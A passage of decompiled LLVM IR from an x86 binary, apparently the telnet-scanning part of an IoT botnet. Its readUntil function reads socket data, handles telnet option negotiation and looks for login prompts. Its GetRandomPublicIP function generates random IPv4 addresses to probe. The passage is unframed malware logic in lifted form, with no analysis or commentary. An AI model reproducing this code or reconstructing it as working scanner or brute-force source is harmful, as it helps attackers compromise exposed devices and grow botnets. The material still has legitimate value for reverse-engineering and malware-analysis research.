  uselistorder [6 x i8]* @global_var_8057a9c.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049a15, { 1, 0 }
  uselistorder label %dec_label_pc_8049986.dec_label_pc_80499ea_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049a8e = ptrtoint i32* %stack_var_-160 to i32
  %tmp33 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049aa8 = urem i32 %arg1, 32
  %v9_8049aab = shl i32 1, %v1_8049aa8
  %v1_8049ab6 = add i32 %arg1, 1
  %v2_8049aba = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049b89 = inttoptr i32 %arg2 to i8*
  %v4_8049b95 = icmp eq i32 %arg3, 0
  %v1_8049bb640 = add i32 %arg8, 2
  %v5_8049bbc43 = icmp slt i32 %v1_8049bb640, %arg7
  br i1 %v5_8049bbc43, label %dec_label_pc_8049bbe.lr.ph, label %dec_label_pc_8049bec

dec_label_pc_8049bbe.lr.ph:                       ; preds = %entry
  %v2_8049aa2 = udiv i32 %arg1, 32
  %v2_8049aab = mul nuw nsw i32 %v2_8049aa2, 4
  %v3_8049aab = add nsw i32 %v2_8049aab, -156
  %v5_8049ae0 = ptrtoint i8* %arg6 to i32
  %tmp38 = icmp slt i32 %arg5, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br label %dec_label_pc_8049bbe

dec_label_pc_8049a84:                             ; preds = %dec_label_pc_8049bcc, %dec_label_pc_8049bbe
  store i32 %v2_8049a8e, i32* @edi, align 4
  %v5_8049a95 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8049aab = load i32, i32* @ebp, align 4
  %v4_8049aab = add i32 %v3_8049aab, %v0_8049aab
  %v5_8049aab = inttoptr i32 %v4_8049aab to i32*
  %v6_8049aab = load i32, i32* %v5_8049aab, align 4
  %v12_8049aab = or i32 %v6_8049aab, %v9_8049aab
  store i32 %v12_8049aab, i32* %v5_8049aab, align 4
  %v5_8049acd = call i32 @__libc_select(i32 %v1_8049ab6, i32 %v2_8049a8e, i32 0, i32 0, i32 %v2_8049aba)
  %tmp35 = icmp slt i32 %v5_8049acd, 1
  br i1 %tmp35, label %dec_label_pc_8049bec, label %dec_label_pc_8049add

dec_label_pc_8049add:                             ; preds = %dec_label_pc_8049a84
  %v6_8049ae0 = add i32 %stack_var_-32.044, %v5_8049ae0
  %v5_8049ae3 = inttoptr i32 %v6_8049ae0 to i8*
  %v5_8049af0 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049ae0, i32 1, i32 0)
  %v13_8049afb = icmp eq i32 %v5_8049af0, -1
  br i1 %v13_8049afb, label %dec_label_pc_8049b07, label %dec_label_pc_8049b01

dec_label_pc_8049b01:                             ; preds = %dec_label_pc_8049add
  %v4_8049b01 = icmp eq i32 %v5_8049af0, 0
  %v1_8049b05 = icmp eq i1 %v4_8049b01, false
  br i1 %v1_8049b05, label %dec_label_pc_8049b16, label %dec_label_pc_8049b07

dec_label_pc_8049b07:                             ; preds = %dec_label_pc_8049b01, %dec_label_pc_8049add
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b16:                             ; preds = %dec_label_pc_8049b01
  %v5_8049b19 = add i32 %v5_8049af0, %stack_var_-32.044
  %v2_8049b1f = load i8, i8* %v5_8049ae3, align 1
  %v11_8049b21 = icmp eq i8 %v2_8049b1f, -1
  %v1_8049b23 = icmp eq i1 %v11_8049b21, false
  br i1 %v1_8049b23, label %dec_label_pc_8049b80, label %dec_label_pc_8049b25

dec_label_pc_8049b25:                             ; preds = %dec_label_pc_8049b16
  %v1_8049b28 = add i32 %v6_8049ae0, 1
  %v5_8049b31 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049b28, i32 2, i32 0)
  %v13_8049b3c = icmp eq i32 %v5_8049b31, -1
  br i1 %v13_8049b3c, label %dec_label_pc_8049b48, label %dec_label_pc_8049b42

dec_label_pc_8049b42:                             ; preds = %dec_label_pc_8049b25
  %v4_8049b42 = icmp eq i32 %v5_8049b31, 0
  %v1_8049b46 = icmp eq i1 %v4_8049b42, false
  br i1 %v1_8049b46, label %dec_label_pc_8049b57, label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %dec_label_pc_8049b42, %dec_label_pc_8049b25
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b57:                             ; preds = %dec_label_pc_8049b42
  %v5_8049b5a = add i32 %v5_8049b31, %v5_8049b19
  %v3_8049b68 = call i32 @negotiate(i32 %arg1, i32 %v6_8049ae0, i32 3)
  %v1_8049b70 = icmp eq i32 %v3_8049b68, 0
  %v1_8049b72 = icmp eq i1 %v1_8049b70, false
  br i1 %v1_8049b72, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049b74

dec_label_pc_8049bb3.backedge:                    ; preds = %dec_label_pc_8049b57, %dec_label_pc_8049b95, %dec_label_pc_8049b9b
  %stack_var_-32.0.be = phi i32 [ %v5_8049b19, %dec_label_pc_8049b95 ], [ %v5_8049b19, %dec_label_pc_8049b9b ], [ %v5_8049b5a, %dec_label_pc_8049b57 ]
  %v1_8049bb6 = add i32 %stack_var_-32.0.be, 2
  %v5_8049bbc = icmp slt i32 %v1_8049bb6, %arg7
  br i1 %v5_8049bbc, label %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge, label %dec_label_pc_8049bec

dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge: ; preds = %dec_label_pc_8049bb3.backedge
  %v3_8049bbe.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049bbe

dec_label_pc_8049b74:                             ; preds = %dec_label_pc_8049b57
  br label %dec_label_pc_8049bf6

dec_label_pc_8049b80:                             ; preds = %dec_label_pc_8049b16
  %v3_8049b89 = call i32 @strstr(i32 %v5_8049ae0, i8* %v2_8049b89)
  %v1_8049b91 = icmp eq i32 %v3_8049b89, 0
  %v1_8049b93 = icmp eq i1 %v1_8049b91, false
  br i1 %v1_8049b93, label %dec_label_pc_8049be0, label %dec_label_pc_8049b95

dec_label_pc_8049b95:                             ; preds = %dec_label_pc_8049b80
  br i1 %v4_8049b95, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049b9b

dec_label_pc_8049b9b:                             ; preds = %dec_label_pc_8049b95
  %v3_8049b9e = call i32 @matchPrompt(i8* %arg6)
  %v1_8049ba6 = icmp eq i32 %v3_8049b9e, 0
  br i1 %v1_8049ba6, label %dec_label_pc_8049bb3.backedge, label %dec_label_pc_8049be0

dec_label_pc_8049bbe:                             ; preds = %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge, %dec_label_pc_8049bbe.lr.ph
  %v3_8049bbe = phi i32 [ %arg4, %dec_label_pc_8049bbe.lr.ph ], [ %v3_8049bbe.pre, %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049bbe.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049bb3.backedge.dec_label_pc_8049bbe_crit_edge ]
  %tmp36 = icmp slt i32 %v3_8049bbe, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_8049a84, label %dec_label_pc_8049bcc

dec_label_pc_8049bcc:                             ; preds = %dec_label_pc_8049bbe
  br i1 %tmp39, label %dec_label_pc_8049a84, label %dec_label_pc_8049bec

dec_label_pc_8049be0:                             ; preds = %dec_label_pc_8049b9b, %dec_label_pc_8049b80
  br label %dec_label_pc_8049bf6

dec_label_pc_8049bec:                             ; preds = %dec_label_pc_8049bb3.backedge, %dec_label_pc_8049bcc, %dec_label_pc_8049a84, %entry
  br label %dec_label_pc_8049bf6

dec_label_pc_8049bf6:                             ; preds = %dec_label_pc_8049be0, %dec_label_pc_8049b74, %dec_label_pc_8049b48, %dec_label_pc_8049b07, %dec_label_pc_8049bec
  %v3_8049bf6 = phi i32 [ 1, %dec_label_pc_8049be0 ], [ 0, %dec_label_pc_8049b74 ], [ 0, %dec_label_pc_8049b48 ], [ 0, %dec_label_pc_8049b07 ], [ 0, %dec_label_pc_8049bec ]
  ret i32 %v3_8049bf6

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_8049b31, { 0, 2, 1 }
  uselistorder i32 %v5_8049af0, { 0, 2, 1 }
  uselistorder i32 %v5_8049ae0, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049bf6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049bec, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bb3.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c04 = load i32, i32* @ebx, align 4
  store i32 %v0_8049c04, i32* %stack_var_-8, align 4
  store i8 0, i8* bitcast (i32* @global_var_805b557.38 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_805b558.39 to i8*), align 8
  store i8 0, i8* @global_var_805b559.40, align 1
  store i8 0, i8* @global_var_805b55a.41, align 2
  %v1_8049c24 = call i32 @random()
  %v2_8049c34 = ashr i32 %v1_8049c24, 31
  %v2_8049c37 = zext i32 %v1_8049c24 to i64
  %v4_8049c37 = zext i32 %v2_8049c34 to i64
  %v5_8049c37 = mul nuw i64 %v4_8049c37, 4294967296
  %v6_8049c37 = or i64 %v5_8049c37, %v2_8049c37
  %v10_8049c37 = srem i64 %v6_8049c37, 255
  %v11_8049c37 = trunc i64 %v10_8049c37 to i32
  store i32 %v11_8049c37, i32* @eax, align 4
  %v1_8049c3b = trunc i64 %v10_8049c37 to i8
  store i8 %v1_8049c3b, i8* bitcast (i32* @global_var_805b557.38 to i8*), align 4
  %v0_8049c40 = call i32 @random()
  %v2_8049c50 = ashr i32 %v0_8049c40, 31
  %v2_8049c53 = zext i32 %v0_8049c40 to i64
  %v4_8049c53 = zext i32 %v2_8049c50 to i64
  %v5_8049c53 = mul nuw i64 %v4_8049c53, 4294967296
  %v6_8049c53 = or i64 %v5_8049c53, %v2_8049c53
  %v10_8049c53 = srem i64 %v6_8049c53, 255
  %v11_8049c53 = trunc i64 %v10_8049c53 to i32
  store i32 %v11_8049c53, i32* @eax, align 4
  %v1_8049c57 = trunc i64 %v10_8049c53 to i8
  store i8 %v1_8049c57, i8* bitcast (i32* @global_var_805b558.39 to i8*), align 8
  %v0_8049c5c = call i32 @random()
  %v2_8049c6c = ashr i32 %v0_8049c5c, 31
  %v2_8049c6f = zext i32 %v0_8049c5c to i64
  %v4_8049c6f = zext i32 %v2_8049c6c to i64
  %v5_8049c6f = mul nuw i64 %v4_8049c6f, 4294967296
  %v6_8049c6f = or i64 %v5_8049c6f, %v2_8049c6f
  %v10_8049c6f = srem i64 %v6_8049c6f, 255
  %v11_8049c6f = trunc i64 %v10_8049c6f to i32
  store i32 %v11_8049c6f, i32* @eax, align 4
  %v1_8049c73 = trunc i64 %v10_8049c6f to i8
  store i8 %v1_8049c73, i8* @global_var_805b559.40, align 1
  %v0_8049c78 = call i32 @random()
  %v2_8049c88 = ashr i32 %v0_8049c78, 31
  %v2_8049c8b = zext i32 %v0_8049c78 to i64
  %v4_8049c8b = zext i32 %v2_8049c88 to i64
  %v5_8049c8b = mul nuw i64 %v4_8049c8b, 4294967296
  %v6_8049c8b = or i64 %v5_8049c8b, %v2_8049c8b
  %v10_8049c8b = srem i64 %v6_8049c8b, 255
  %v11_8049c8b = trunc i64 %v10_8049c8b to i32
  store i32 %v11_8049c8b, i32* @eax, align 4
  %v1_8049c8f = trunc i64 %v10_8049c8b to i8
  store i8 %v1_8049c8f, i8* @global_var_805b55a.41, align 2
  %v0_8049c94 = call i32 @random()
  %v2_8049ca4 = ashr i32 %v0_8049c94, 31
  %v2_8049ca7 = zext i32 %v0_8049c94 to i64
  %v4_8049ca7 = zext i32 %v2_8049ca4 to i64
  %v5_8049ca7 = mul nuw i64 %v4_8049ca7, 4294967296
  %v6_8049ca7 = or i64 %v5_8049ca7, %v2_8049ca7
  %v10_8049ca7 = srem i64 %v6_8049ca7, 208
  %v11_8049ca7 = trunc i64 %v10_8049ca7 to i32
  store i32 %v11_8049ca7, i32* @edx, align 4
  %v4_8049cac = icmp eq i32 %v11_8049ca7, 0
  %v1_8049cb0 = icmp eq i1 %v4_8049cac, false
  br i1 %v1_8049cb0, label %dec_label_pc_8049cdc, label %dec_label_pc_8049cb2

dec_label_pc_8049cb2:                             ; preds = %entry
  %v0_8049cb2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049cb2 = zext i8 %v0_8049cb2 to i32
  store i32 %v1_8049cb2, i32* @edx, align 4
  %v0_8049cbe = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049cbe = zext i8 %v0_8049cbe to i32
  %v2_8049ccd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ccd, i32* @ebx, align 4
  %v5_8049cd4 = call i32 @szprintf(i32 %v2_8049ccd, i32 ptrtoint ([12 x i8]* @global_var_8057aa3.42 to i32), i32 %v1_8049cbe, i32 %v1_8049cb2)
  br label %dec_label_pc_8049cdc

dec_label_pc_8049cdc:                             ; preds = %entry, %dec_label_pc_8049cb2
  %v12_8049cdc = icmp eq i32 %v11_8049ca7, 1
  %v1_8049ce0 = icmp eq i1 %v12_8049cdc, false
  br i1 %v1_8049ce0, label %dec_label_pc_8049d0c, label %dec_label_pc_8049ce2

dec_label_pc_8049ce2:                             ; preds = %dec_label_pc_8049cdc
  %v0_8049ce2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049ce2 = zext i8 %v0_8049ce2 to i32
  store i32 %v1_8049ce2, i32* @edx, align 4
  %v0_8049cee = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049cee = zext i8 %v0_8049cee to i32
  %v2_8049cfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cfd, i32* @ebx, align 4
  %v5_8049d04 = call i32 @szprintf(i32 %v2_8049cfd, i32 ptrtoint ([15 x i8]* @global_var_8057aaf.43 to i32), i32 %v1_8049cee, i32 %v1_8049ce2)
  br label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %dec_label_pc_8049cdc, %dec_label_pc_8049ce2
  %v12_8049d0c = icmp eq i32 %v11_8049ca7, 2
  %v1_8049d10 = icmp eq i1 %v12_8049d0c, false
  br i1 %v1_8049d10, label %dec_label_pc_8049d3c, label %dec_label_pc_8049d12

dec_label_pc_8049d12:                             ; preds = %dec_label_pc_8049d0c
  %v0_8049d12 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049d12 = zext i8 %v0_8049d12 to i32
  store i32 %v1_8049d12, i32* @edx, align 4
  %v0_8049d1e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049d1e = zext i8 %v0_8049d1e to i32
  %v2_8049d2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d2d, i32* @ebx, align 4
  %v5_8049d34 = call i32 @szprintf(i32 %v2_8049d2d, i32 ptrtoint ([12 x i8]* @global_var_8057abe.44 to i32), i32 %v1_8049d1e, i32 %v1_8049d12)
  br label %dec_label_pc_8049d3c

dec_label_pc_8049d3c:                             ; preds = %dec_label_pc_8049d0c, %dec_label_pc_8049d12
  %v12_8049d3c = icmp eq i32 %v11_8049ca7, 3
  %v1_8049d40 = icmp eq i1 %v12_8049d3c, false
  br i1 %v1_8049d40, label %dec_label_pc_8049d6c, label %dec_label_pc_8049d42

dec_label_pc_8049d42:                             ; preds = %dec_label_pc_8049d3c
  %v0_8049d42 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049d42 = zext i8 %v0_8049d42 to i32
  store i32 %v1_8049d42, i32* @edx, align 4
  %v0_8049d4e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049d4e = zext i8 %v0_8049d4e to i32
  %v2_8049d5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5d, i32* @ebx, align 4
  %v5_8049d64 = call i32 @szprintf(i32 %v2_8049d5d, i32 ptrtoint ([13 x i8]* @global_var_8057aca.45 to i32), i32 %v1_8049d4e, i32 %v1_8049d42)
  br label %dec_label_pc_8049d6c

dec_label_pc_8049d6c:                             ; preds = %dec_label_pc_8049d3c, %dec_label_pc_8049d42
  %v12_8049d6c = icmp eq i32 %v11_8049ca7, 4
  %v1_8049d70 = icmp eq i1 %v12_8049d6c, false
  br i1 %v1_8049d70, label %dec_label_pc_8049d9c, label %dec_label_pc_8049d72

dec_label_pc_8049d72:                             ; preds = %dec_label_pc_8049d6c
  %v0_8049d72 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049d72 = zext i8 %v0_8049d72 to i32
  store i32 %v1_8049d72, i32* @edx, align 4
  %v0_8049d7e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049d7e = zext i8 %v0_8049d7e to i32
  %v2_8049d8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d8d, i32* @ebx, align 4
  %v5_8049d94 = call i32 @szprintf(i32 %v2_8049d8d, i32 ptrtoint ([11 x i8]* @global_var_8057ad7.46 to i32), i32 %v1_8049d7e, i32 %v1_8049d72)
  br label %dec_label_pc_8049d9c

dec_label_pc_8049d9c:                             ; preds = %dec_label_pc_8049d6c, %dec_label_pc_8049d72
  %v12_8049d9c = icmp eq i32 %v11_8049ca7, 5
  %v1_8049da0 = icmp eq i1 %v12_8049d9c, false
  br i1 %v1_8049da0, label %dec_label_pc_8049dcc, label %dec_label_pc_8049da2

dec_label_pc_8049da2:                             ; preds = %dec_label_pc_8049d9c
  %v0_8049da2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049da2 = zext i8 %v0_8049da2 to i32
  store i32 %v1_8049da2, i32* @edx, align 4
  %v0_8049dae = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049dae = zext i8 %v0_8049dae to i32
  %v2_8049dbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dbd, i32* @ebx, align 4
  %v5_8049dc4 = call i32 @szprintf(i32 %v2_8049dbd, i32 ptrtoint ([14 x i8]* @global_var_8057ae2.47 to i32), i32 %v1_8049dae, i32 %v1_8049da2)
  br label %dec_label_pc_8049dcc

dec_label_pc_8049dcc:                             ; preds = %dec_label_pc_8049d9c, %dec_label_pc_8049da2
  %v12_8049dcc = icmp eq i32 %v11_8049ca7, 6
  %v1_8049dd0 = icmp eq i1 %v12_8049dcc, false
  br i1 %v1_8049dd0, label %dec_label_pc_8049dfc, label %dec_label_pc_8049dd2

dec_label_pc_8049dd2:                             ; preds = %dec_label_pc_8049dcc
  %v0_8049dd2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049dd2 = zext i8 %v0_8049dd2 to i32
  store i32 %v1_8049dd2, i32* @edx, align 4
  %v0_8049dde = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049dde = zext i8 %v0_8049dde to i32
  %v2_8049ded = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ded, i32* @ebx, align 4
  %v5_8049df4 = call i32 @szprintf(i32 %v2_8049ded, i32 ptrtoint ([12 x i8]* @global_var_8057af0.48 to i32), i32 %v1_8049dde, i32 %v1_8049dd2)
  br label %dec_label_pc_8049dfc

dec_label_pc_8049dfc:                             ; preds = %dec_label_pc_8049dcc, %dec_label_pc_8049dd2
  %v12_8049dfc = icmp eq i32 %v11_8049ca7, 7
  %v1_8049e00 = icmp eq i1 %v12_8049dfc, false
  br i1 %v1_8049e00, label %dec_label_pc_8049e2c, label %dec_label_pc_8049e02

dec_label_pc_8049e02:                             ; preds = %dec_label_pc_8049dfc
  %v0_8049e02 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049e02 = zext i8 %v0_8049e02 to i32
  store i32 %v1_8049e02, i32* @edx, align 4
  %v0_8049e0e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049e0e = zext i8 %v0_8049e0e to i32
  %v2_8049e1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e1d, i32* @ebx, align 4
  %v5_8049e24 = call i32 @szprintf(i32 %v2_8049e1d, i32 ptrtoint ([13 x i8]* @global_var_8057afc.49 to i32), i32 %v1_8049e0e, i32 %v1_8049e02)
  br label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %dec_label_pc_8049dfc, %dec_label_pc_8049e02
  %v12_8049e2c = icmp eq i32 %v11_8049ca7, 8
  %v1_8049e30 = icmp eq i1 %v12_8049e2c, false
  br i1 %v1_8049e30, label %dec_label_pc_8049e5c, label %dec_label_pc_8049e32

dec_label_pc_8049e32:                             ; preds = %dec_label_pc_8049e2c
  %v0_8049e32 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049e32 = zext i8 %v0_8049e32 to i32
  store i32 %v1_8049e32, i32* @edx, align 4
  %v0_8049e3e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049e3e = zext i8 %v0_8049e3e to i32
  %v2_8049e4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e4d, i32* @ebx, align 4
  %v5_8049e54 = call i32 @szprintf(i32 %v2_8049e4d, i32 ptrtoint ([14 x i8]* @global_var_8057b09.50 to i32), i32 %v1_8049e3e, i32 %v1_8049e32)
  br label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049e2c, %dec_label_pc_8049e32
  %v12_8049e5c = icmp eq i32 %v11_8049ca7, 9
  %v1_8049e60 = icmp eq i1 %v12_8049e5c, false
  br i1 %v1_8049e60, label %dec_label_pc_8049e8c, label %dec_label_pc_8049e62

dec_label_pc_8049e62:                             ; preds = %dec_label_pc_8049e5c
  %v0_8049e62 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049e62 = zext i8 %v0_8049e62 to i32
  store i32 %v1_8049e62, i32* @edx, align 4
  %v0_8049e6e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049e6e = zext i8 %v0_8049e6e to i32
  %v2_8049e7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e7d, i32* @ebx, align 4
  %v5_8049e84 = call i32 @szprintf(i32 %v2_8049e7d, i32 ptrtoint ([14 x i8]* @global_var_8057b17.51 to i32), i32 %v1_8049e6e, i32 %v1_8049e62)
  br label %dec_label_pc_8049e8c

dec_label_pc_8049e8c:                             ; preds = %dec_label_pc_8049e5c, %dec_label_pc_8049e62
  %v12_8049e8c = icmp eq i32 %v11_8049ca7, 10
  %v1_8049e90 = icmp eq i1 %v12_8049e8c, false
  br i1 %v1_8049e90, label %dec_label_pc_8049ebc, label %dec_label_pc_8049e92

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e8c
  %v0_8049e92 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049e92 = zext i8 %v0_8049e92 to i32
  store i32 %v1_8049e92, i32* @edx, align 4
  %v0_8049e9e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049e9e = zext i8 %v0_8049e9e to i32
  %v2_8049ead = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ead, i32* @ebx, align 4
  %v5_8049eb4 = call i32 @szprintf(i32 %v2_8049ead, i32 ptrtoint ([14 x i8]* @global_var_8057b25.52 to i32), i32 %v1_8049e9e, i32 %v1_8049e92)
  br label %dec_label_pc_8049ebc

dec_label_pc_8049ebc:                             ; preds = %dec_label_pc_8049e8c, %dec_label_pc_8049e92
  %v12_8049ebc = icmp eq i32 %v11_8049ca7, 11
  %v1_8049ec0 = icmp eq i1 %v12_8049ebc, false
  br i1 %v1_8049ec0, label %dec_label_pc_8049eec, label %dec_label_pc_8049ec2

dec_label_pc_8049ec2:                             ; preds = %dec_label_pc_8049ebc
  %v0_8049ec2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049ec2 = zext i8 %v0_8049ec2 to i32
  store i32 %v1_8049ec2, i32* @edx, align 4
  %v0_8049ece = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049ece = zext i8 %v0_8049ece to i32
  %v2_8049edd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049edd, i32* @ebx, align 4
  %v5_8049ee4 = call i32 @szprintf(i32 %v2_8049edd, i32 ptrtoint ([11 x i8]* @global_var_8057b33.53 to i32), i32 %v1_8049ece, i32 %v1_8049ec2)
  br label %dec_label_pc_8049eec

dec_label_pc_8049eec:                             ; preds = %dec_label_pc_8049ebc, %dec_label_pc_8049ec2
  %v12_8049eec = icmp eq i32 %v11_8049ca7, 12
  %v1_8049ef0 = icmp eq i1 %v12_8049eec, false
  br i1 %v1_8049ef0, label %dec_label_pc_8049f1c, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049eec
  %v0_8049ef2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049ef2 = zext i8 %v0_8049ef2 to i32
  store i32 %v1_8049ef2, i32* @edx, align 4
  %v0_8049efe = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049efe = zext i8 %v0_8049efe to i32
  %v2_8049f0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0d, i32* @ebx, align 4
  %v5_8049f14 = call i32 @szprintf(i32 %v2_8049f0d, i32 ptrtoint ([14 x i8]* @global_var_8057b3e.54 to i32), i32 %v1_8049efe, i32 %v1_8049ef2)
  br label %dec_label_pc_8049f1c

dec_label_pc_8049f1c:                             ; preds = %dec_label_pc_8049eec, %dec_label_pc_8049ef2
  %v12_8049f1c = icmp eq i32 %v11_8049ca7, 13
  %v1_8049f20 = icmp eq i1 %v12_8049f1c, false
  br i1 %v1_8049f20, label %dec_label_pc_8049f4c, label %dec_label_pc_8049f22

dec_label_pc_8049f22:                             ; preds = %dec_label_pc_8049f1c
  %v0_8049f22 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049f22 = zext i8 %v0_8049f22 to i32
  store i32 %v1_8049f22, i32* @edx, align 4
  %v0_8049f2e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049f2e = zext i8 %v0_8049f2e to i32
  %v2_8049f3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3d, i32* @ebx, align 4
  %v5_8049f44 = call i32 @szprintf(i32 %v2_8049f3d, i32 ptrtoint ([13 x i8]* @global_var_8057b4c.55 to i32), i32 %v1_8049f2e, i32 %v1_8049f22)
  br label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f1c, %dec_label_pc_8049f22
  %v12_8049f4c = icmp eq i32 %v11_8049ca7, 14
  %v1_8049f50 = icmp eq i1 %v12_8049f4c, false
  br i1 %v1_8049f50, label %dec_label_pc_8049f7c, label %dec_label_pc_8049f52

dec_label_pc_8049f52:                             ; preds = %dec_label_pc_8049f4c
  %v0_8049f52 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049f52 = zext i8 %v0_8049f52 to i32
  store i32 %v1_8049f52, i32* @edx, align 4
  %v0_8049f5e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049f5e = zext i8 %v0_8049f5e to i32
  %v2_8049f6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f6d, i32* @ebx, align 4
  %v5_8049f74 = call i32 @szprintf(i32 %v2_8049f6d, i32 ptrtoint ([13 x i8]* @global_var_8057b59.56 to i32), i32 %v1_8049f5e, i32 %v1_8049f52)
  br label %dec_label_pc_8049f7c

dec_label_pc_8049f7c:                             ; preds = %dec_label_pc_8049f4c, %dec_label_pc_8049f52
  %v12_8049f7c = icmp eq i32 %v11_8049ca7, 15
  %v1_8049f80 = icmp eq i1 %v12_8049f7c, false
  br i1 %v1_8049f80, label %dec_label_pc_8049fac, label %dec_label_pc_8049f82

dec_label_pc_8049f82:                             ; preds = %dec_label_pc_8049f7c
  %v0_8049f82 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049f82 = zext i8 %v0_8049f82 to i32
  store i32 %v1_8049f82, i32* @edx, align 4
  %v0_8049f8e = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049f8e = zext i8 %v0_8049f8e to i32
  %v2_8049f9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f9d, i32* @ebx, align 4
  %v5_8049fa4 = call i32 @szprintf(i32 %v2_8049f9d, i32 ptrtoint ([13 x i8]* @global_var_8057b66.57 to i32), i32 %v1_8049f8e, i32 %v1_8049f82)
  br label %dec_label_pc_8049fac

dec_label_pc_8049fac:                             ; preds = %dec_label_pc_8049f7c, %dec_label_pc_8049f82
  %v9_8049fac = icmp eq i32 %v11_8049ca7, 16
  %v1_8049fb0 = icmp eq i1 %v9_8049fac, false
  br i1 %v1_8049fb0, label %dec_label_pc_8049fdc, label %dec_label_pc_8049fb2

dec_label_pc_8049fb2:                             ; preds = %dec_label_pc_8049fac
  %v0_8049fb2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049fb2 = zext i8 %v0_8049fb2 to i32
  store i32 %v1_8049fb2, i32* @edx, align 4
  %v0_8049fbe = load i8, i8* @global_var_805b559.40, align 1
